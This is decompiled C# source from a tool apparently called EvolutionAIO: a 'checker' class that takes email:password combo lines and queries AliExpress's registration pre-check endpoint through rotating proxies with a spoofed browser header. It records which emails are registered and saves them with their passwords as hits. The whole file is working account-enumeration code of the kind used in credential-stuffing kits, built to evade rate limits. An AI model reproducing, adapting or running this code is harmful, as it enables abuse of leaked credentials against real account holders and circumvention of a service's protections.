// Decompiled with JetBrains decompiler
// Type: EvolutionAIO.Checkers.AliVM
// Assembly: EvolutionAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FFBD76CC-A7A1-4682-B132-DAECA7C9FD32
// Assembly location: C:\Users\Pc\Downloads\Evolutionv2\EvolutionAIO.exe

using Leaf.xNet;
using System;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

namespace EvolutionAIO.Checkers
{
  internal class AliVM
  {
    public static bool check(string[] s, string proxy)
    {
      if (0 >= Config.config.retries + 1)
        return false;
      while (true)
      {
        try
        {
          using (HttpRequest httpRequest = new HttpRequest())
          {
            proxy = Menu.proxies.ElementAt<string>(new Random().Next(Menu.proxiesCount));
            if (Menu.proxyProtocol == "HTTP")
              httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
            if (Menu.proxyProtocol == "SOCKS4")
              httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
            if (Menu.proxyProtocol == "SOCKS5")
              httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
            httpRequest.IgnoreProtocolErrors = true;
            httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
            httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
            httpRequest.AddHeader("Pragma", "no-cache");
            httpRequest.AddHeader("Accept", "*/*");
            HttpResponse httpResponse = httpRequest.Get("https://login.aliexpress.com/join/preCheckForRegister.htm?registerFrom=AE_MAIN_POPUP_WHOLESALE&umidToken=TF8667EB6100A86A003D1394117BC098531BE493439628104133F08A610&ua=121%23%2FYnlk%2Fa66JQlVlhdG8AelLTlA0fNT33VOnraqEg2vw7DKxJnEEpSlhyY8psdK5jVllKY%2BzPIDMlSAQOZZLQPll9YAcWZKujVVyeH4FJ5KM9lOlrJEGiIlMLYAcfdK5jVlmuY%2BapIxM9VO3rnEkDIll9YOc8dKkjVlwgZZgz4XluVS0bvsbc9MtFPe6GG62ibYnsshu%2FmCjVDkeILF9K0bZs0JnCVMZujhLzT83%2Fybbi0CNk1INn0lPi0n6XSp2D0kZ748u%2FmCbibCeIaFtWbbZrDnnx9pCibCZ0T83BhC6ibBZRXB9hWMZecnzgmunYsUueNIG%2Fm7%2FibvehuddcVC6ibn5u9lfAHASYrvd0P1hdYMiBzHDlG1xhSAXe2Dp5YLO7aWyVA%2BDZKhnH1NiATHbEtUNISsaxdYZ9JlCSwwX5pMXwc8lSgokSUKkFgeP1eO1B8mXC2MYwSfvzuZ%2FvPVHwANcTEnu3J9F2wjA2%2FSdncze%2B72x4i56LOdJqyOCgEhs4TtfNNLb0zTryXyyaDcmdDeaRtp6fmiuYnh8kAdtewMVr9ngS9QM0udY13dLJgrnu6FkyC2i2lYQ9hGC5xcJ72YIp8OUNcwzQulMbnIDxmTB8XLh8LedQCmyaxpiVCVzWAVAWziRGif4CKGP4wE5AowYwdYMnOUF0Sg2QTOBvyuGCCJxkdozXdCPpIJQfQOwq13VkWq8OxJ9X9OqtPv4iq3S%2FpUTxs6p9z7qpN0fEUVBpfZwZqgdX0vdo8z0gW1bgXtszPBMdT7YaQoTtLAVqoQ899JeNmu7LN6yPaClZUkeojQ7DFzKlWratog0OIPp31Erenh%2BofLciibLpzqPzHnb8ulHCZhYBDDobTeeM2aHejvSs7SEWQTIzcwH0dwN5pFU1Uvg1NtW6d8mXeAWroHIiNvKeqRWc76A%2BbSu7nL0CFIZKezWp5hFZa6cT13T6WJ%2FkgHzGtSYO%2B80Z4D6omU%2FAByCPOlsotsO269hynZscAXTgD4wt9fz2Ge%2BAMy3lGRP9GnONcP0Zac5J%2BDA9JD0gkOo%2FYCBngFPJhRDKEzcXngKhvb7HQWZU3mDAJ3U7DP7TQujUgBclZ6%2B3d%2BVQO3DUs1CPOpfljgMRHYgOjp2fdca63StbJ1ciUc4UvLzc0jrKYFl2wjv4amBWosw%3D%3D&email=" + s[0]);
            Save.AsResult("AliExpressVM", "R", httpResponse.ToString());
            if (!httpResponse.ToString().Contains("\"isEmailExisted\":true}"))
              return false;
            ++Menu.hits;
            Save.AsResult("AliExpressVM", "Valid Mails", s[0] + ":" + s[1]);
            if (Menu.p1 == "2")
              Colorful.Console.WriteLine(" [+] " + s[0] + ":" + s[1] + " | Registered", Color.Green);
            return false;
          }
        }
        catch (Exception ex)
        {
          if (ex.ToString().Contains("Index was outside the bounds of the array"))
            return false;
          ++Menu.errors;
        }
      }
    }
  }
}
